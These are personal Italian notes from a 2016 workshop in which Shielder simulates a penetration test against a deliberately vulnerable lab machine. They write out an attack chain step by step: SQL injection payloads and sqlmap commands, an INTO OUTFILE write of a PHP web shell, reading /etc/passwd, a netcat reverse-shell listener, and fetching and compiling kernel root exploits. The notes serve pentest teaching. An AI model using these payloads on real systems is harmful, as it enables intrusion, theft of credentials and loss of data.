# Hacker di professione: simulazione di un Penetration Test

## Speakers: Shielder`s guys

## Date: 13-04-2016

## Conference event: JEToP - Junior Enterprise Torino Politecnico

**[ITA]**

Durante le 8 ore del corso, i partecipanti assisteranno ad una breve introduzione al mondo della Sicurezza Informatica, focalizzandosi in particolare sull'attività di Penetration Testing. Per Penetration Test si intende un'attività che ha lo scopo di identificare e sfruttare la vulnerabilità di un sistema, ripercorrendo i tipici passaggi di un attacante malintenzionato (Cracker). La sostanziale differenza tra un Cracker ed un Penetration Tester è che quest'ultimo ha l'obbiettivo di identificare ogni vulnerabilità e non quello di ottenere semplicemente accesso al sistema target dell`attività, creando infine un report, che verrà consegnato all`azienda che ha richiesto il test, la quale si occuperà di fixare i problemi riscontrati. Nella giornata, previa una breve, ma approfondita introduzione su organismi ed enti che dettano norme e linee guide del settore, si andrà a simulare un reale Penetration Test. La simulazione verrà condotta ai danni di una macchina volutamente vulnerabile, utilizzando i classici strumenti di un Penetration Tester, nello specifico si impiegherà la nota distribuzione Linux "BackBox", nata dall`idea di un Security Researcher Italiano.

### My Actual Notes

@smaury alla scrivania! Ci daranno un paio di macchine per fare i tests.

Adesso si presentano, e parlano della loro società, Shielder. (sono due `92 e un`95 - e da un hanno hanno una società - FUCK)

Quando come azienda vengono coinvolti, ci sono essenzialmente tre fasi:

- Richiesta

    L`azienda chiede di fare un assesment di sicurezza su qualcosa.

- Ingaggio

    Si effettuano degli scan, si eliminano i falsi positivi delle vulnerabilità trovate al volo, e poi si passa al penetration test.

    Che è a tutti gli effetti un attacco contro il software/web app/ cosa che il cliente vuole testato.

    A parte il pentest viene anche valutato il lato social engineering (phising, dumbster diving, intrusioni informatiche, etc).

    La IS2701 (?) certifica che alcune policy di sicurezza verranno rispettate (ex: i dischi rigidi vengono smaltiti in un certo modo, la carta intestata pure, etc etc).

- Risultati

    Si da`al cliente un report con l'elenco delle vulnerabilità note, e come patcharle. All`incirca 3 report:

  - Executive Summary = Manager/ CdA
  - Vulnerability Details = Security Manager
  - Remediation Plan = SysAdmin

Una cosa da non sottovalutare è la parte contrattuale: infatti c`è la Manleva, ossia la obbligazione, assunta verso altri, di sollevarli dalle conseguenze patrimoniali dannose di venti o di atti il cui verificarsi sia del tutto eventuale; si distingue dalla fideiussione perchè la garanzia non concerne solo il possibile inadempimento... (bla bla bla) Insomma, ci sono un botto di vincoli di responsabilità nel contratto.

-- inizia la parte di pentest (con @smaury)

Si simula un`azienda (Monolito) che abbia bisogno di fare un assesment di sicurezza.

OWASP (?)  è una fondazione che suggerisce le linee guida sullo sviluppo sicuro del codice e le metodologie di pentest. (riconosciuto a livello internazionale) (è open source)

In genere il primo step è testare la TOP TEN delle vulnerabilità di OWASP.

Nel mondo della sicurezza informatica si tende a rendere tutto il più pubblico possibile perchè è impossibile che uno da solo riesca a coprire tutto.

Backbox ovviamente èmmeglio. (Kali ha alle spalle un`azienda)

cybrary.it è un ottimo tool per imparare sicurezza e avere certificazioni.

eLearn security, OSCP e Offensive Security rilasciano certificazioni molto ben viste.

(in piccolo inframezzo di Omar sul lanciarsi a fare impresa)

-- ok ora inizia sul serio

Ovviamente usare GUI/programmi rischiano di avere molti script kiddies, ma chi si limita a quello non dovrebbe fare sicurezza.

Dal punto di vista legale bisogna essere assicurati per bene, sia via assicurazioni che stare nel contratto.

HackerOne è una piattaforma ottima per imparare/testare.

L'Italia non è un paese per ethical hacker. Vulnhub.com è un`altro sito, da` macchine virtuali rotte apposta.

-- pausa caffè --

Ok adesso si comincia con la parte tecnica. Schema:

` Attaccante = 192.168.56.1

-- firewall con porte aperte: 21 (FTP), 22(SSH), 80(HTTP), 443(HTTPS) --

Attaccato = 192.158.56.101 (monolito spa) `

Primo step: `ping`. E poi `ifconfig`. Classici per verificare che tutto sia configurato.

NMAP permette di fare scansioni di porte e servizi attivi su degli ip.

`man nmap` -> per imparare cosa fa NMAP

Primo vero comando:

`sudo nmap -T4 -A -v -p1-65535 monolito.spa`

Per fare la scansione di tutte le porte TCP (non ci serve UDP).

Fondamentalmente ci mette 5-10 minuti.

--Per accedere a server sempre meglio avere solo accesso SSH via chiave pub/pri.

--FTP normalmente è sconsigliato perchè in chiaro. Sarebbe meglio usare SFTP, che usa ssh.

--HTTP permette man in the middle!

NMAP ha già trovato che ci sono dei servizi che permettono utenti anonimi,  altre informazioni (ex. è un debian).

Dato che c`è la porta 80 aperta una cosa facile facile da fare è contattare il server via http, ossia aprirlo su Firefox. Stessa cosa via FTP.

Per SSH possiamo guessare che l`utente root@monolito.spa sia attivo. E anche la password possiamo provare a guessarla. Ma dopo un paio di tentativi ci fermiamo (la brute force non la facciamo perchè non è interessante) (anche perchè basta installare dei servizi tipo failtoban che impedisce bruteforce).

Torniamo su FTP, apriamo Filezilla. Possiamo connetterci come "anonymous", e va. Possiamo vedere che siamo dentro la main directory, e ci da` la possibilità di salire di un livello. Fino a "/". Proviamo a caricare un file da eseguire (in qualche modo), però non riusciamo: 550 Permission Denied.

Però sappiamo la versione del server FTP: vsfpd 2.3.5. Possiamo allora cercare un exploit noto su Internet, su exploit-db.com (il più famoso).

Per questo in particolare, non ce ne sono per questa versione; potremmo analizzare il sorgente per cercare 0day, ma non è il caso per oggi.

-> possiamo dire nel report che, anche se non abbiamo una vulnerabilità aperta, FTP non va bene (non è cifrato) e far accedere anonymous è UGH. (2 punti legati alla FTP che non sono sicuri)

"Tutto potrebbe essere un honeypot" - @smaury 2016

Proviamo allora a passare dall`HHTP, dovremmo essere in grado di trovare millemila vulnerabilità: in questo caso serve avere un minimo di background come web developer che permette di sapere "ad occhio" cosa abbiamo di fronte.

Non è detto che su un portale ci siano solo le pagine/cartelle che vengono proposte nella pagina: via Backbox possiamo usare un tool dirs3arch che permette di trovarle tutte, passato l`url. Ovviamente lo fa usando una wordlist (tipo un dizionario)

`dirs3arch --url <http://monolito.spa> -e php,js,html`

Gli lasciamo la wordlist di default.

Ha trovato la cartella js, una cgi forbidden, una css, etc etc... e anche un phpmyadmin (interfaccia per gestire db)

Queste informazioni possono essere relativamente utili, ma sono comunque dati da tenere utili! Potrebbero tornarci utili in futuro.

**bisogna sempre segnarsi tutto (anche le cose più banali, tipo i directory listing)**

La cartella upload ci permette di speculare che dovrebbe essere scrivibile! Se riuscissimo ad entrarci...

Quando si fa pentest conviene usare dei proxy trasparenti: lui fa le richieste al server, non tu, e ti tiene la cache. E permette quindi di fare dei reply e cose simili.

In questo caso usiamo ZAP (di OWASP), l`altro famoso è burpsuite (barp?)(che è a pagamento e non open source).

Noi praticamente diciamo a firefox di contattare ZAP, e lui si occuperà di fare le richieste a monolito.spa. (questo va fatto dentro le impostazioni di firefox)

Dentro ZAP c`è praticamente la stessa cosa che fa la console di Chrome.

Fatto quindi un refresh vediamo tutto ciò che passa: a differenza della console di Chrome possiamo usare tutta una serie di funzionalità in più! Tipo i resend, etc etc, fare fuzzing e vedere cosa succede.

Ok, ora... da dove partiamo? Spesso partire dal form di ricerca è comodo, in genere la saninatizzazione non viene fatta bene, etc etc.

Facendo la ricerca possiamo vedere che compare nell`url, e nella pagina. Insomma, ci deve essere un javascript+xml (XSS) da qualche parte.

-- Gabriele ora presenta la parte di Javascript. Parlando di Injection. (potrei essere in grado di prendermi i cookie di sessione)

BeEF = broswer exploitation framework (scritto da un italiano) per sfruttare queste tecniche.

Facciamo un tentativo modificando l`url aggiungendo delle tag HTML.

Cacchio, possiamo modificare il risultato che compare! Ma allora mettiamoci del javascript. Iniziamo con un alert standard.

Questi funzionano: quindi posso usarlo per cose molto più malevole, usando BeEF, che crea un server temporaneo che crea un javascript per fare exploiting sulla vittima. (ex: session hijacking, screenshots, prendere accesso della webcam, etc)

-> Nel nostro report scriveremo che il sito è vulnerabile al cross-site scripting, XSS.

Questa vulnerabilità è tallmente presente che esiste un sito che si chiama xssposed.org in cui sono listati i siti ce l`hanno.

Per questo genere di vulnerabilità, essendo lato client, non sono reato di per sè (se le trovate). (perchè state hackerando voi stessi)

Ok. Adesso andiamo nella pagina di News: perchè? Perchè assieme alla Search è l`altra sezione dinamica del sito, quasi sicuramente.

Infatti news è .php, quindi ci sarà del codice che parlerà con il server e magari anche il database.

Ci sono 7 news in questa pagina: proviamo ad aprirne la prima. AH! Nell`url c`è un id=1. Quindi c`è una base dati da cui prende quelle info!

-- Gabiele fa una spiegazione sui database. I dati sono organizzati in tabelle, ordinati e divisi in colonne: posso interrogarli attraverso la famiglia di linguaggi SQL, che al primo impatto è molto semplice. Pesco dati, li ordino e li processo: posso anche stabilire delle policy di accesso.     Ad esempio se l`interrogazione che adesso il sito sta facendo è su una tabella linkata ad altre, posso cercare di allargare la richiesta SQL per ottenere maggior informazioni.

Visto che la query sarà circa una cosa come

`SELECT * FROM news WHERE id=1`

Quell`id=1 lo legge dall'url: forse allora possiamo modificarla...

`SELECT * FROM news WHERE id=1 OR 1==1`

Questo dovrebbe permettere di estrarre tutto! Ed infatti funziona. Peccato che non dovremmo poterlo fare.

Allora, visto che abbiamo capito che possiamo fare delle query più complesse, usando ad esempio UNION. O, meglio ancora, usiamo ORDER, che ci permette di, per tentativi, scoprire quante colonne ha il db.

`SELECT * FROM news WHERE id=1 ORDER by 6`

Spacca tutto. Quindi abbiamo 5 colonne.

Questa è una _SQL INJECTION_.

Proviamo ora con la union:

`SELECT * FROM news WHERE id=1 UNION ALL SELECT 1,2,3,4,5`

In questo modo faccio vedere tutte le colonne. Se poi metto

`SELECT * FROM news WHERE id=-1 UNION ALL SELECT 1,2,3,4,5`

Così "pulisco" la pagina e vedo solo gli altri elementi.

Per MYSQL, c'è un comando`@@version` che permettte di sapere la versione.

`SELECT * FROM news WHERE id=-1 UNION ALL SELECT 1,2,3,@@version,5`

Che ci dice che siamo sulla versione di MYSQL 5.5.47.

Similmente per lo user

`SELECT * FROM news WHERE id=-1 UNION ALL SELECT 1,user(),3,@@version,5`

Parlo con il db con lo user root@localhost!

E quindi, adesso che sappiamo che c`è, possiamo far che prendere un tool che fa tutto quello che sarebbe troppo noioso fare.

`sqlmap --url "<http://monolito.spa/read_news.php?id=1>" --dbms mysql`

Lui prende, fa cose, vede gente.

E ha trovato 4 tipologie di attachi possibili.

L'attacco con lo SLEEP è molto "variabile", perchè dipende molto dall`infrastruttura di rete.

Ok, ora sappiamo che è vulnerabile quindi possiamo aggiungere:

`sqlmap --url "<http://monolito.spa/read_news.php?id=1>" --dbms mysql --dbs`

Che ci ritorna tutti i db presenti, e possiamo quindi fare di meglio, aprire e scoprire i nomi delle colonne, e leggerci i valori.

In MYSQL ci sono anche delle funzionalità che permettono di scrivere dei file, ovunque questo sia possibile. Quindi potremmo buttare qualcosa in upload (che in genere ha il 777)... mwahah!

Ma allora potremmo scrivere un file .php che permette di eseguire del codice sul server! Inoltre dentro php si può eseguire dello scripting che giri sul localhost del server.

Allora torniamo su Firefox... scriviamo: (sfruttando la nostra conoscenza di apache)

`SELECT * FROM news WHERE id=-1 UNION ALL SELECT 1, 2, 3, 4, 5 into outfile`/var/www/upload/a.php` `

Ok, ora vediamo se l`ha scritto andando su /upload/a.php.

Ma allora andiamo a scrivere una bella stringa...

`SELECT * FROM news WHERE id=-1 UNION ALL SELECT 1, 2, 3, 4, <?php system($_GET["cmd"]) ?> into outfile`/var/www/upload/b.php` `

In questo modo scrivo un file, che verrà elaborato lato server, che mi apre una shell di sistema sul server stesso!

E adesso, se andiamo su `/upload/b.php?cmd=whoiam`

BOOM! Ho accesso al terminale del server!

E questo mi permette di andare a leggere, via `cmd=cat /etc/passwd`, il file con tutte le utenze!

--- pausa pranzo ---

And we`re back!

@smaury ci presenta un ragazzo che si occupa anche di sicurezza informatica via NFC e cose simili (RFID) (nome?).

Tornando a noi, possiamo fare altri comandi tipo:

`/upload/b.php?cmd=cat ../news.php`

E leggendo il file php possiamo leggere cosa fa. Non molto, quindi:

`/upload/b.php?cmd=cat ../read_news.php`

Che ci da` informazioni in più, tra cui la password di gestione del db. Che possiamo usare in phpmyadmin, che abbiamo sgamato prima!

Dopo aver fatto l`accesso a phpmyadmin possiamo, ad esempio, esportarci i dati.

Però adesso ciò che vogliamo fare è passare da essere uno user che esegue i comandi... vogliamo elevare il nostro livello a root.

Per farlo, primo step è andare a vedere il kernel linux della macchina su cui gira il server via `uname -a`.

Trovato il kernel, andiamo di nuovo su exploit-db cerchiamo vulnerabilità note per il kernel linux 3.0.1.: in genere bisogna cercare "local root exploit".

Però è un po` scomodo inserire comandi via url, quindi usiamo un tool chiamato weevely che ci genera un file per usare una shell interattiva nel server. La generiamo e poi la carichiamo su upload, passandogli la password.

In questo modo siamo entrati, da terminale, dentro il server.

Dopodichè, via uget, andiamo a prendere il file di exploit trovato e lo scarichiamo direttamente in /upload.

Fatto questo, bisogna compilarlo. Una volta compilato, se cerchiamo di eseguirlo non succederà niente: abbiamo bisogno di essere via ssh o simili!

Quindi dobbiamo riuscire ad aprire una shell TTI: per farlo, possiamo passare da python. Via terminale, usando python, possiamo andar a creare una _reverse shell_ che "bypassi" il firewall, tramite l`uso di netcat.

`nc -lvvp 1337`

Questo comando permetterà la connessione: ed inoltre, questo farà in modo che il rumore generato dal nostro impatto diminuisca visto che sono lor a collegarsi a noi.

Per eseguire l'exploit diciamo a python di eseguire una console TTI, e una volta dentro (simbolo $) possiamo eseguire l`exploit, che fa trasformare il $ in # (che è la gloria).

E a questo punto posso andare a beccare il file pwd, e leggere quindi le password.

-- questa però non è l`unica strada per diventare root della macchina.

Andiamo in un'altra sezione del sito... /bat. Lì dentro c`è un file TODO su cui il sysadmin ha scritto delle funzioni ancora da implementare. Lì c'è il riferimento ad un`altro file, in cui ci sono delle credenziali gmail in chiaro.

Possiamo fare l`accesso a gmail allora! (anche se in realtà fail perchè si è segnato la password sbagliata)

Detto questo, possiamo beccare la password di ssh (che era poi sempre `ilovemymono` - cosa che capita!).

-- Altro tipo di "attacco"

Attraverso sqlmap possiamo scaricarci le password hashate, e poi usare un dictionary/rainbow table per sgamarle.

Addirittura ne ha uno già suo di default... e funziona! (ha sgamato quella di root)

A parte l`exploit usato prima (mempopipper.c), un altro exploit che funziona si chiama semtex.c.

Eseguendo gli stessi step di prima, compilandolo etc etc... non va! Perchè non abbiamo letto il commento in testa al file, che da` il comando giusto di compilazione. (mancava una flag)

-- Per riassumere

Abbiamo eseguito un pentest su la macchina del cliente, siamo riusciti ad arrivare al livello di root: questo apre le porte a praticamente un'infinità di attacchi, visto che siamo utenti privilegiati nel sistema. Tra l'altro visto che siamo root possiamo cancellare anche i log.

Fatto tutto ciò, bisogna fare la reportistica, che è strutturata come dicevamo prima. Ma non solo, dobbiamo anche "lasciare delle evidenze" delle vulnerabilità trovate, in modo che non posssano controbattere sulla loro effettiva esistenza.

Si può usare anche un sito (CVSS calculator 3.0) che aiuta a generare un report con degli score che aiuti il cliente a capire quali sono le criticità del sistema.

(ad esempio, la SQL injection ha un punteggio di 9.9 - Critical)

Oltre a descrivere la vulnerabilità bisogna anche (se si ha la competenza) proporre una soluzione. Il primo step in questo senso è sempre usare OWASP.

Occhio che gli exploit che si trovano "già fatti" ogni tanto sono fake che formattano le macchine su cui girano.  

### The speaker bio

Shielder è un'impresa specializzata nel campo della Sicurezza Informatica e dello Sviluppo Web, la quale, attraverso un approccio moderno ed in costante sviluppo, si interfaccia in modo ottimale con un ambito sensibile e in continua evoluzione come quello dell`Informatica. Nata dall`idea di due ragazzi neo-diplomati nel 2014 l`azienda nasce come agglomerato di ditte individuali e a distanza di un anno muta in S.R.L. grazie ai diversi clienti che, sia nell`ambito dello Sviluppo Web che in quello della Sicurezza Informatica, le hanno dato da subito fiducia. Ad oggi Shielder vanta un vasto portfolio di clienti importanti ed una costante crescita, che le ha permesso di ampliare il proprio personale, avvalendosi sempre di giovani e talentuose menti cui viene data la possibilità di lavorare in un ambiente informale e stimolante.

### The conference description

JEToP – Junior Enterprise Torino Politecnico – é una Junior Enterprise, associazione no-profit e apolitica gestita da studenti con l'obiettivo di creare un contatto diretto tra il mondo dell`università e quello del lavoro.
